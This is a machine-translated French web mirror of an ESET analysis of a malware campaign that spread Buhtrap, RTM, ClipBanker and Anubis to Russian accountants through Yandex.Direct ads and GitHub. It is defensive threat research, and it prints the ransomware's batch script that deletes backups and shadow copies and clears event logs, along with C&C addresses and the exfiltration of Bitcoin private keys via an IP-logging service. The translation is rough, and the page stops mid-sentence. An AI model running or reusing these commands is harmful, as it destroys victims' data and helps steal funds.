<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üßëüèº‚Äçü§ù‚Äçüßëüèº üëø ü§¨ La porte d√©rob√©e et le chiffreur Buhtrap ont √©t√© distribu√©s √† l'aide de Yandex.Direct ‚òÇÔ∏è ü•† üë©‚Äç‚ù§Ô∏è‚Äçüë©</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pour cibler une cyberattaque sur les comptables, vous pouvez utiliser les documents de travail qu'ils recherchent sur le r√©seau. Au cours des derniers...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>La porte d√©rob√©e et le chiffreur Buhtrap ont √©t√© distribu√©s √† l'aide de Yandex.Direct</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/450126/"> Pour cibler une cyberattaque sur les comptables, vous pouvez utiliser les documents de travail qu'ils recherchent sur le r√©seau.  Au cours des derniers mois, quelque chose comme √ßa a √©t√© un cyber-groupe qui distribue les c√©l√®bres portes d√©rob√©es <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Buhtrap</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">RTM</a> , ainsi que des chiffreurs et des logiciels pour voler des crypto-monnaies.  La plupart des cibles se trouvent en Russie.  L'attaque est mise en ≈ìuvre en pla√ßant des annonces malveillantes dans Yandex.Direct.  Les victimes potentielles se sont rendues sur un site o√π il leur a √©t√© demand√© de t√©l√©charger un fichier malveillant d√©guis√© en mod√®le de document.  Yandex a supprim√© les publicit√©s malveillantes apr√®s notre avertissement. <br><br>  Le code source de Buhtrap a √©t√© fusionn√© dans le r√©seau par le pass√©, donc tout le monde peut l'utiliser.  Nous ne disposons pas d'informations concernant la disponibilit√© du code RTM. <br><br>  Dans un article, nous expliquerons comment les attaquants ont distribu√© des logiciels malveillants √† l'aide de Yandex.Direct et les ont h√©berg√©s sur GitHub.  Le poste sera compl√©t√© par une analyse technique du malvari. <br><br><img src="https://habrastorage.org/webt/y3/h0/ly/y3h0lyhh0aq4jl6dwpvaia-vf2q.png"><br><br><a name="habracut"></a><h2>  Buhtrap et RTM de retour dans les affaires </h2><br><h4>  M√©canisme de distribution et victimes </h4><br>  Les diff√©rentes charges utiles livr√©es aux victimes sont unies par un m√©canisme de distribution commun.  Tous les fichiers malveillants cr√©√©s par des cybercriminels se trouvaient dans deux r√©f√©rentiels GitHub diff√©rents. <br><br>  Habituellement, dans le r√©f√©rentiel se trouvait un fichier malveillant t√©l√©charg√©, qui changeait souvent.  Comme vous pouvez voir l'historique des modifications dans le r√©f√©rentiel sur GitHub, nous pouvons voir quel type de malware s'est propag√© pendant une certaine p√©riode.  Pour convaincre la victime de t√©l√©charger un fichier malveillant, le site blanki-shabloni24 [.] Ru, illustr√© dans la figure ci-dessus, a √©t√© utilis√©. <br><br>  La conception du site et tous les noms des fichiers malveillants sont coh√©rents dans un seul concept - formulaires, mod√®les, contrats, √©chantillons, etc. √âtant donn√© que les logiciels Buhtrap et RTM ont √©t√© utilis√©s dans des attaques contre des comptables dans le pass√©, nous avons suppos√© que la strat√©gie √©tait la m√™me dans la nouvelle campagne.  La seule question est de savoir comment la victime est arriv√©e sur le site des assaillants. <br><br><h4>  L'infection </h4><br>  Au moins quelques victimes potentielles sur ce site ont √©t√© attir√©es par des publicit√©s malveillantes.  Voici un exemple d'URL: <br><br> <code>https://blanki-shabloni24.ru/?utm_source=yandex&amp;utm_medium=banner&amp;utm_campaign=cid|{blanki_rsya}|context&amp;utm_content=gid|3590756360|aid|6683792549|15114654950_&amp;utm_term=  &amp;pm_source=bb.f2.kz&amp;pm_block=none&amp;pm_position=0&amp;yclid=1029648968001296456</code> <br> <br>  Comme vous pouvez le voir sur le lien, la banni√®re a √©t√© publi√©e sur le forum comptable l√©gitime bb.f2 [.] Kz.  Il est important de noter que des banni√®res sont apparues sur diff√©rents sites, tout le monde avait le m√™me identifiant de campagne (blanki_rsya), et la plupart √©taient li√©es aux services de comptabilit√© ou d'assistance juridique.  Il ressort de l'URL que la victime potentielle a utilis√© le formulaire de demande de t√©l√©chargement de compte, ce qui renforce notre hypoth√®se concernant les attaques cibl√©es.  Voici les sites o√π les banni√®res et les recherches associ√©es sont apparues. <br><br><ul><li>  t√©l√©charger le formulaire de compte - bb.f2 [.] kz </li><li>  exemple de contrat - Ipopen [.] en </li><li>  √©chantillon de plainte de d√©claration - 77metrov [.] ru </li><li>  formulaire de contrat - blank-dogovor-kupli-prodazhi [.] en </li><li>  √©chantillon de p√©tition - zen.yandex [.] ru </li><li>  exemple de plainte - jeudi [.] en </li><li>  exemples de formulaires de contrat - Regforum [.] en </li><li>  formulaire de contrat - assistentus [.] en </li><li>  exemple de contrat d'appartement - napravah [.] com </li><li>  √©chantillons de contrat l√©gal - avito [.] ru </li></ul><br>  Le site de blanki-shabloni24 [.] Ru a peut-√™tre √©t√© am√©nag√© pour passer par une simple √©valuation visuelle.  En r√®gle g√©n√©rale, la publicit√© menant √† un site d'aspect professionnel avec un lien vers GitHub ne ressemble pas √† quelque chose de manifestement mauvais.  De plus, les attaquants n'ont t√©l√©charg√© des fichiers malveillants dans le r√©f√©rentiel que pendant une p√©riode limit√©e, probablement pendant la campagne.  La plupart du r√©f√©rentiel sur GitHub √©tait une archive zip vide ou un fichier exe propre.  Ainsi, les attaquants pourraient diffuser de la publicit√© via Yandex.Direct sur les sites les plus susceptibles d'√™tre visit√©s par des comptables venus pour des requ√™tes de recherche sp√©cifiques. <br><br>  Ensuite, consid√©rez les diff√©rentes charges utiles r√©parties de cette fa√ßon. <br><br><h2>  Analyse de la charge utile </h2><br><h4>  Chronologie de la distribution </h4><br>  La campagne contre les logiciels malveillants a d√©but√© fin octobre 2018 et est active au moment de la r√©daction de l'article.  √âtant donn√© que l'int√©gralit√© du r√©f√©rentiel √©tait accessible au public sur GitHub, nous avons compil√© une chronologie pr√©cise de la distribution de six familles de logiciels malveillants diff√©rentes (voir la figure ci-dessous).  Nous avons ajout√© une ligne indiquant le moment o√π un lien de banni√®re a √©t√© d√©tect√©, selon la t√©l√©m√©trie ESET, pour comparaison avec l'historique git.  Comme vous pouvez le voir, cela correspond bien √† la disponibilit√© de la charge utile sur GitHub.  L'√©cart √† la fin de f√©vrier peut s'expliquer par notre absence d'une partie de l'historique des modifications, car le r√©f√©rentiel a √©t√© supprim√© de GitHub avant que nous ne puissions l'obtenir compl√®tement. <br><br><img src="https://habrastorage.org/webt/sa/ua/1i/saua1i6vupxtv2pa-tvwawje8em.png"><br>  <i>Figure 1. Chronologie de la distribution des malvari.</i> <br><br><h4>  Certificats de signature de certificat </h4><br>  La campagne a utilis√© beaucoup de certificats.  Certains ont sign√© plus d'une famille de logiciels malveillants, ce qui indique en outre que diff√©rents √©chantillons appartiennent √† la m√™me campagne.  Malgr√© la disponibilit√© de la cl√© priv√©e, les op√©rateurs n'ont pas sign√© syst√©matiquement les fichiers binaires et n'ont pas utilis√© la cl√© pour tous les √©chantillons.  Fin f√©vrier 2019, les attaquants ont commenc√© √† cr√©er des signatures non valides √† l'aide d'un certificat appartenant √† Google, sur lequel ils n'ont pas de cl√© priv√©e. <br><br>  Tous les certificats impliqu√©s dans la campagne et les familles Malvari qu'ils signent sont r√©pertori√©s dans le tableau ci-dessous. <br><br><img src="https://habrastorage.org/webt/wg/q_/-8/wgq_-807r6mtilzeam28lhbbrvi.png"><br><br>  Nous avons √©galement utilis√© ces certificats de signature de code pour communiquer avec d'autres familles de logiciels malveillants.  Pour la plupart des certificats, nous n'avons pas trouv√© d'√©chantillons qui ne seraient pas distribu√©s via le r√©f√©rentiel GitHub.  Cependant, le certificat TOV ¬´MARIYA¬ª a √©t√© utilis√© pour signer le Malvari, propri√©t√© du <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">botnet</a> Wauchos, des logiciels publicitaires et des mineurs.  Il est peu probable que ce malware soit associ√© √† cette campagne.  Tr√®s probablement, le certificat a √©t√© achet√© sur le darknet. <br><br><h4>  Win32 / Filecoder.Buhtrap </h4><br>  Le premier composant qui a attir√© notre attention a √©t√© le premier Win32 / Filecoder.Buhtrap d√©couvert.  Il s'agit d'un fichier binaire Delphi qui peut parfois √™tre empaquet√©.  Il a √©t√© principalement distribu√© en f√©vrier - mars 2019.  Il se comporte comme s'il s'agissait d'un programme de ran√ßongiciel - il recherche les disques locaux et les dossiers r√©seau et crypte les fichiers d√©tect√©s.  Pour faire des compromis, il n'a pas besoin d'une connexion Internet, car il ne contacte pas le serveur pour envoyer des cl√©s de chiffrement.  Au lieu de cela, il ajoute un ¬´jeton¬ª √† la fin du message de rachat et sugg√®re d'utiliser le courrier √©lectronique ou Bitmessage pour communiquer avec les op√©rateurs. <br><br>  Pour crypter autant de ressources importantes que possible, Filecoder.Buhtrap lance un flux con√ßu pour fermer les logiciels cl√©s, qui peuvent avoir des gestionnaires de fichiers ouverts contenant des informations pr√©cieuses, qui peuvent interf√©rer avec le cryptage.  Les processus cibles sont principalement des syst√®mes de gestion de base de donn√©es (SGBD).  De plus, Filecoder.Buhtrap supprime les fichiers journaux et les sauvegardes pour rendre la r√©cup√©ration des donn√©es difficile.  Pour ce faire, le script batch ci-dessous est ex√©cut√©. <br><br> <code>bcdedit /set {default} bootstatuspolicy ignoreallfailures <br> bcdedit /set {default} recoveryenabled no <br> wbadmin delete catalog -quiet <br> wbadmin delete systemstatebackup <br> wbadmin delete systemstatebackup -keepversions:0 <br> wbadmin delete backup <br> wmic shadowcopy delete <br> vssadmin delete shadows /all /quiet <br> reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f <br> reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f <br> reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" <br> attrib "%userprofile%\documents\Default.rdp" -s -h <br> del "%userprofile%\documents\Default.rdp" <br> wevtutil.exe clear-log Application <br> wevtutil.exe clear-log Security <br> wevtutil.exe clear-log System <br> sc config eventlog start=disabled</code> <br> <br>  Filecoder.Buhtrap utilise le service en ligne l√©gitime IP Logger, cr√©√© pour collecter des informations sur les visiteurs du site.  Ceci est destin√© √† suivre les victimes de l'encodeur, dont la ligne de commande est responsable: <br><br> <code>mshta.exe "javascript:document.write('');"</code> <br> <br>  Les fichiers √† chiffrer sont s√©lectionn√©s en cas de non-correspondance sur les trois listes d'exceptions.  Premi√®rement, les fichiers avec les extensions suivantes ne sont pas chiffr√©s: .com, .cmd, .cpl, .dll, .exe, .hta, .lnk, .msc, .msi, .msp, .pif, .scr, .sys et .bat.  Deuxi√®mement, tous les fichiers pour lesquels le chemin d'acc√®s complet contient des lignes de r√©pertoire de la liste ci-dessous sont exclus. <br><br> <code>\.{ED7BA470-8E54-465E-825C-99712043E01C}\ <br> \tor browser\ <br> \opera\ <br> \opera software\ <br> \mozilla\ <br> \mozilla firefox\ <br> \internet explorer\ <br> \google\chrome\ <br> \google\ <br> \boot\ <br> \application data\ <br> \apple computer\safari\ <br> \appdata\ <br> \all users\ <br> :\windows\ <br> :\system volume information\ <br> :\nvidia\ <br> :\intel\</code> <br> <br>  Troisi√®mement, certains noms de fichiers sont √©galement exclus du cryptage, parmi lesquels le nom du fichier de messages avec demande de ran√ßon.  La liste est pr√©sent√©e ci-dessous.  √âvidemment, toutes ces exceptions sont con√ßues pour pr√©server la capacit√© de d√©marrer la machine, mais avec sa convivialit√© minimale. <br><br> <code>boot.ini <br> bootfont.bin <br> bootsect.bak <br> desktop.ini <br> iconcache.db <br> ntdetect.com <br> ntldr <br> ntuser.dat <br> ntuser.dat.log <br> ntuser.ini <br> thumbs.db <br> winupas.exe <br> your files are now encrypted.txt <br> windows update assistant.lnk <br> master.exe <br> unlock.exe <br> unlocker.exe</code> <br> <br><h4>  Sch√©ma de cryptage des fichiers </h4><br>  Une fois lanc√©, le malware g√©n√®re une paire de cl√©s RSA 512 bits.  L'exposant priv√© (d) et le module (n) sont ensuite chiffr√©s √† l'aide d'une cl√© publique cod√©e en dur de 2048 bits (exposant et module public), compress√©e en zlib et encod√©e en base64.  Le code responsable de cela est illustr√© √† la figure 2. <br><br><img src="https://habrastorage.org/webt/c_/p_/g9/c_p_g9rfnoggxyffe9jedxgibrk.png"><br>  <i>Figure 2. R√©sultat de la d√©compilation Hex-Rays du processus de g√©n√©ration d'une paire de cl√©s RSA 512 bits.</i> <br><br>  Ce qui suit est un exemple de texte brut avec une cl√© priv√©e g√©n√©r√©e, qui est un jeton attach√© au message de ran√ßon. <br><br> <code>DF9228F4F3CA93314B7EE4BEFC440030665D5A2318111CC3FE91A43D781E3F91BD2F6383E4A0B4F503916D75C9C576D5C2F2F073ADD4B237F7A2B3BF129AE2F399197ECC0DD002D5E60C20CE3780AB9D1FE61A47D9735036907E3F0CF8BE09E3E7646F8388AAC75FF6A4F60E7F4C2F697BF6E47B2DBCDEC156EAD854CADE53A239</code> <br> <br>  La cl√© publique des attaquants est indiqu√©e ci-dessous. <br><br> <code>e = 0x72F750D7A93C2C88BFC87AD4FC0BF4CB45E3C55701FA03D3E75162EB5A97FDA7ACF8871B220A33BEDA546815A9AD9AA0C2F375686F5009C657BB3DF35145126C71E3C2EADF14201C8331699FD0592C957698916FA9FEA8F0B120E4296193AD7F3F3531206608E2A8F997307EE7D14A9326B77F1B34C4F1469B51665757AFD38E88F758B9EA1B95406E72B69172A7253F1DFAA0FA02B53A2CC3A7F0D708D1A8CAA30D954C1FEAB10AD089EFB041DD016DCAAE05847B550861E5CACC6A59B112277B60AC0E4E5D0EA89A5127E93C2182F77FDA16356F4EF5B7B4010BCCE1B1331FCABFFD808D7DAA86EA71DFD36D7E701BD0050235BD4D3F20A97AAEF301E785005 <br> n = 0x212ED167BAC2AEFF7C3FA76064B56240C5530A63AB098C9B9FA2DE18AF9F4E1962B467ABE2302C818860F9215E922FC2E0E28C0946A0FC746557722EBB35DF432481AC7D5DDF69468AF1E952465E61DDD06CDB3D924345A8833A7BC7D5D9B005585FE95856F5C44EA917306415B767B684CC85E7359C23231C1DCBBE714711C08848BEB06BD287781AEB53D94B7983EC9FC338D4320129EA4F568C410317895860D5A85438B2DA6BB3BAAE9D9CE65BCEA6760291D74035775F28DF4E6AB1A748F78C68AB07EA166A7309090202BB3F8FBFC19E44AC0B4D3D0A37C8AA5FA90221DA7DB178F89233E532FF90B55122B53AB821E1A3DB0F02524429DEB294B3A4EDD</code> <br> <br>  Les fichiers sont crypt√©s √† l'aide d'AES-128-CBC avec une cl√© de 256 bits.  Pour chaque fichier chiffr√©, une nouvelle cl√© et un nouveau vecteur d'initialisation sont g√©n√©r√©s.  Les informations cl√©s sont ajout√©es √† la fin du fichier crypt√©.  Consid√©rez le format de fichier crypt√©. <br>  Les fichiers chiffr√©s ont l'en-t√™te suivant: <br><br><img src="https://habrastorage.org/webt/lo/-e/7m/lo-e7mo1l2ta7ie0n2rlz0ybirs.png"><br><br>  Les donn√©es du fichier source avec l'ajout de la valeur magique VEGA sont crypt√©es jusqu'aux premiers 0x5000 octets.  Toutes les informations pour le d√©chiffrement sont jointes √† un fichier avec la structure suivante: <br><br><img src="https://habrastorage.org/webt/iw/hy/az/iwhyaz2vw5c45i6vk0s4hs_sadq.png"><br><br>  - Le marqueur de taille de fichier contient une √©tiquette indiquant si le fichier est sup√©rieur √† 0x5000 octets <br>  - Blob de cl√© AES = ZlibCompress (RSAEncrypt (cl√© AES + IV, cl√© publique de la paire de cl√©s RSA g√©n√©r√©e) <br>  - Blob de cl√© RSA = ZlibCompress (RSAEncrypt (cl√© priv√©e RSA g√©n√©r√©e, cl√© publique RSA cod√©e en dur)) <br><br><h4>  Win32 / ClipBanker </h4><br>  Win32 / ClipBanker est un composant qui a √©t√© distribu√© par intermittence de fin octobre √† d√©but d√©cembre 2018.  Son r√¥le est de suivre le contenu du presse-papiers, il recherche les adresses des portefeuilles de crypto-monnaie.  Apr√®s avoir d√©termin√© l'adresse du portefeuille cible, ClipBanker le remplace par l'adresse qui appartiendrait aux op√©rateurs.  Les √©chantillons que nous avons √©tudi√©s n'√©taient ni emball√©s ni masqu√©s.  Le seul m√©canisme utilis√© pour masquer le comportement est le cryptage des cha√Ænes.  Les adresses des portefeuilles des op√©rateurs sont crypt√©es √† l'aide de RC4.  Ciblez les crypto-monnaies - Bitcoin, Bitcoin cash, Dogecoin, Ethereum et Ripple. <br><br>  Pendant la p√©riode de distribution des logiciels malveillants, une petite quantit√© a √©t√© envoy√©e au MTC vers les portefeuilles Bitcoin de l'attaquant, ce qui jette un doute sur le succ√®s de la campagne.  De plus, il n'y a aucune raison de supposer que ces transactions √©taient g√©n√©ralement li√©es √† ClipBanker. <br><br><h4>  Win32 / RTM </h4><br>  Le composant Win32 / RTM a √©t√© distribu√© pendant plusieurs jours d√©but mars 2019.  RTM est un banquier cheval de Troie bas√© sur Delphi destin√© aux syst√®mes bancaires √† distance.  En 2017, les chercheurs d'ESET ont publi√© une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">analyse d√©taill√©e de</a> ce programme, la description est toujours d'actualit√©.  En janvier 2019, Palo Alto Networks a √©galement publi√© <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">un article de blog sur RTM</a> . <br><br><h4>  T√©l√©chargeur Buhtrap </h4><br>  Pendant un certain temps, un t√©l√©chargeur √©tait disponible sur GitHub, contrairement aux outils Buhtrap pr√©c√©dents.  Il va √† <code>https://94.100.18[.]67/RSS.php?&lt;some_id&gt;</code> pour l'√©tape suivante et le charge directement en m√©moire.  On peut distinguer deux comportements du code de deuxi√®me √©tape.  Dans la premi√®re URL, RSS.php a directement pass√© la porte d√©rob√©e Buhtrap - cette porte d√©rob√©e est tr√®s similaire √† celle disponible apr√®s la fuite du code source. <br><br>  Fait int√©ressant, nous voyons plusieurs campagnes avec une porte d√©rob√©e Buhtrap, et elles sont probablement dirig√©es par diff√©rents op√©rateurs.  Dans ce cas, la principale diff√©rence est que la porte d√©rob√©e est charg√©e directement en m√©moire et n'utilise pas le sch√©ma habituel avec le processus de d√©ploiement de DLL, dont nous avons parl√© <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">plus t√¥t</a> .  De plus, les op√©rateurs ont modifi√© la cl√© RC4 utilis√©e pour crypter le trafic r√©seau vers le serveur C&amp;C.  Dans la plupart des campagnes que nous avons vues, les op√©rateurs se moquaient de changer cette cl√©. <br><br>  Le deuxi√®me comportement, plus complexe - l'URL RSS.php a √©t√© transmise par un autre chargeur.  Il a impl√©ment√© un certain obscurcissement, comme la reconstruction d'une table d'importation dynamique.  Le but du chargeur de d√©marrage est de contacter le serveur C&amp;C <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">msiofficeupd</a> [.] Com / api / F27F84EDA4D13B15 / 2, d'envoyer des journaux et d'attendre une r√©ponse.  Il traite la r√©ponse comme un blob, la charge en m√©moire et s'ex√©cute.  La charge utile que nous avons vue lors de l'ex√©cution de ce chargeur √©tait la m√™me porte d√©rob√©e Buhtrap, mais il peut y avoir d'autres composants. <br><br><h4>  Android / Spy.Banker </h4><br>  Fait int√©ressant, un composant pour Android a √©galement √©t√© trouv√© dans le r√©f√©rentiel GitHub.  Il n'√©tait dans la succursale principale que pour une seule journ√©e - le 1er novembre 2018.  En plus d'√™tre h√©berg√©e sur GitHub, la t√©l√©m√©trie ESET ne trouve aucune preuve de la propagation de ce malware. <br><br>  Le composant a √©t√© h√©berg√© en tant que package d'application Android (APK).  Il est tr√®s obscurci.  Un comportement malveillant est cach√© dans le fichier JAR chiffr√© situ√© dans l'APK.  Il est crypt√© RC4 avec cette cl√©: <br><br> <code>key = [ <br> 0x87, 0xd6, 0x2e, 0x66, 0xc5, 0x8a, 0x26, 0x00, 0x72, 0x86, 0x72, 0x6f, <br> 0x0c, 0xc1, 0xdb, 0xcb, 0x14, 0xd2, 0xa8, 0x19, 0xeb, 0x85, 0x68, 0xe1, <br> 0x2f, 0xad, 0xbe, 0xe3, 0xb9, 0x60, 0x9b, 0xb9, 0xf4, 0xa0, 0xa2, 0x8b, 0x96 <br> ]</code> <br> <br>  La m√™me cl√© et le m√™me algorithme sont utilis√©s pour crypter les cha√Ænes.  JAR se trouve dans <code>APK_ROOT + image/files</code> .  Les 4 premiers octets du fichier contiennent la longueur du fichier JAR chiffr√©, qui commence imm√©diatement apr√®s le champ de longueur. <br><br>  Apr√®s avoir d√©crypt√© le fichier, nous avons constat√© qu'il s'agit d'Anubis - un banquier d√©j√† <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">document√©</a> pour Android.  Un logiciel malveillant a les fonctions suivantes: <br><br><ul><li>  enregistrement microphone </li><li>  prendre des captures d'√©cran </li><li>  obtenir des coordonn√©es GPS </li><li>  enregistreur de frappe </li><li>  chiffrement des donn√©es de l'appareil et demande de ran√ßon </li><li>  spamming </li></ul><br>  Fait int√©ressant, le banquier a utilis√© Twitter comme canal de communication de secours pour obtenir un autre serveur C&amp;C.  L'√©chantillon que nous avons analys√© utilisait le compte @JohnesTrader, mais au moment de l'analyse, il √©tait d√©j√† bloqu√©. <br><br>  Le banquier contient une liste d'applications cibl√©es sur un appareil Android.  Elle est devenue plus longue que la liste obtenue √† partir de l'√©tude Sophos.  La liste contient de nombreuses applications bancaires, des programmes d'achat en ligne tels qu'Amazon et eBay, des services de crypto-monnaie. <br><br><h4>  MSIL / ClipBanker.IH </h4><br>  Le dernier composant distribu√© dans le cadre de cette campagne √©tait l'ex√©cutable Windows .NET, qui est apparu en mars 2019.  La plupart des versions √©tudi√©es ont √©t√© emball√©es par ConfuserEx v1.0.0.  Comme ClipBanker, ce composant utilise le presse-papiers.  Son objectif est un large √©ventail de crypto-monnaies, ainsi que des offres sur Steam.  En outre, il utilise le service IP Logger pour voler la cl√© WIF priv√©e de Bitcoin. <br><br>  M√©canismes de protection <br>  En plus des avantages que ConfuserEx offre sous la forme de contrebalancer le d√©bogage, le vidage et la falsification, le composant a la capacit√© de d√©tecter les produits antivirus et les machines virtuelles. <br><br>  Pour v√©rifier le lancement dans une machine virtuelle, le malware utilise la ligne de commande WMI int√©gr√©e de Windows (WMIC) pour demander des informations sur le BIOS, √† savoir: <br><br> <code>wmic bios</code> <br> <br>  Ensuite, le programme analyse la sortie de la commande et recherche des mots cl√©s: VBOX, VirtualBox, XEN, qemu, bochs, VM. <br><br>  Pour d√©tecter les produits antivirus, les logiciels malveillants envoient une demande WMI (Windows Management Instrumentation) au Centre de s√©curit√© Windows √† l'aide de l'API <code>ManagementObjectSearcher</code> comme indiqu√© ci-dessous.  Apr√®s d√©codage √† partir de base64, l'appel ressemble √† ceci: <br><br> <code>ManagementObjectSearcher('root\\SecurityCenter2', 'SELECT * FROM AntivirusProduct')</code> <br> <br><img src="https://habrastorage.org/webt/wb/xv/tv/wbxvtvcwmxo9w45kjramkqmcy-s.png"><br>  <i>Figure 3. Processus de d√©termination des produits antivirus.</i> <br><br>  De plus, le malware v√©rifie si <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">CryptoClipWatcher</a> , un outil de protection contre les attaques du presse-papiers, est en cours d'ex√©cution, et s'il est en cours d'ex√©cution, il interrompt tous les threads de ce processus, d√©sactivant ainsi la protection. <br><br><h4>  Persistance </h4><br>  La version du logiciel malveillant que nous avons √©tudi√©e se copie dans <code>%APPDATA%\google\updater.exe</code> et d√©finit l'attribut ¬´cach√©¬ª dans le r√©pertoire google.  Il modifie ensuite la valeur de <code>Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell</code> dans le registre Windows et ajoute le chemin <code>updater.exe</code> .  Un malware sera donc ex√©cut√© √† chaque fois qu'un utilisateur se connecte. <br><br><h4>  Comportement malveillant </h4><br>  Comme ClipBanker, le malware surveille le contenu du presse-papiers et recherche les adresses des portefeuilles de crypto-monnaie, et lorsqu'il le trouve, le remplace par l'une des adresses de l'op√©rateur.  Vous trouverez ci-dessous une liste d'adresses de destination bas√©e sur ce qui a √©t√© trouv√© dans le code. <br><br> <code>BTC_P2PKH, BTC_P2SH, BTC_BECH32, BCH_P2PKH_CashAddr, BTC_GOLD, LTC_P2PKH, LTC_BECH32, LTC_P2SH_M, ETH_ERC20, XMR, DCR, XRP, DOGE, DASH, ZEC_T_ADDR, ZEC_Z_ADDR, STELLAR, NEO, ADA, IOTA, NANO_1, NANO_3, BANANO_1, BANANO_3, STRATIS, NIOBIO, LISK, QTUM, WMZ, WMX, WME, VERTCOIN, TRON, TEZOS, QIWI_ID, YANDEX_ID, NAMECOIN, B58_PRIVATEKEY, STEAM_URL</code> <br> <br>  Pour chaque type d'adresse, il existe une expression r√©guli√®re correspondante.  La valeur STEAM_URL est utilis√©e pour attaquer le syst√®me Steam, comme le montre l'expression r√©guli√®re, qui est utilis√©e pour d√©terminer dans le tampon: <br><br> <code>\b(https:\/\/|http:\/\/|)steamcommunity\.com\/tradeoffer\/new\/\?partner=[0-9]+&amp;token=[a-zA-Z0-9]+\b</code> <br> <br><h4>  Canal d'exfiltration </h4><br>  En plus de remplacer les adresses dans le tampon, le malware est destin√© aux cl√©s WIF priv√©es des portefeuilles Bitcoin, Bitcoin Core et Electrum Bitcoin.  Le programme utilise plogger.org comme canal d'exfiltration pour obtenir la cl√© priv√©e WIF.  Pour ce faire, les op√©rateurs ajoutent les donn√©es de cl√© priv√©e √† l'en-t√™te HTTP User-Agent, comme illustr√© ci-dessous. <br><br><img src="https://habrastorage.org/webt/fz/xc/us/fzxcusdwmjnv8irew2lhlnlg7ss.png"><br>  <i>Figure 4. Console IP Logger avec sortie.</i> <br><br>  Les op√©rateurs n'ont pas utilis√© iplogger.org pour exfiltrer les portefeuilles.  Ils ont probablement eu recours √† une m√©thode diff√©rente en raison de la restriction de 255 caract√®res dans le champ <code>User-Agent</code> affich√© dans l'interface Web IP Logger.  Dans les √©chantillons que nous avons √©tudi√©s, un autre serveur de sortie de donn√©es a √©t√© stock√© dans la <code>DiscordWebHook</code> environnement <code>DiscordWebHook</code> .  √âtonnamment, cette variable d'environnement n'est affect√©e nulle part dans le code.  Cela sugg√®re que le logiciel malveillant est toujours en cours de d√©veloppement et que la variable est affect√©e sur la machine de test de l'op√©rateur. <br><br>  Il y a un autre signe que le programme est en cours d'√©laboration.  Le binaire comprend deux URL iplogger.org, et une demande est envoy√©e aux deux lors de l'exfiltration des donn√©es.  Dans une demande adress√©e √† l'une de ces URL, la valeur du champ Referer est pr√©c√©d√©e de "DEV /".  Nous avons √©galement trouv√© une version qui n'√©tait pas mise en package √† l'aide de ConfuserEx, le destinataire de cette URL est nomm√© DevFeedbackUrl.  Sur la base du nom de la variable d'environnement, nous pensons que les op√©rateurs envisagent d'utiliser le service Discord l√©gitime et son syst√®me d'interception Web pour voler des portefeuilles de crypto-monnaie. <br><br><h2>  Conclusion </h2><br>  Cette campagne est un exemple de l'utilisation de services publicitaires l√©gitimes dans les cyberattaques.  Le programme est destin√© aux organisations russes, mais nous ne serons pas surpris de voir une telle attaque utiliser des services non russes.  Pour √©viter tout compromis, les utilisateurs doivent avoir confiance en la r√©putation de la source du logiciel t√©l√©charg√©. <br><br>  Une liste compl√®te des indicateurs de compromis et d'attributs MITRE ATT &amp; CK est 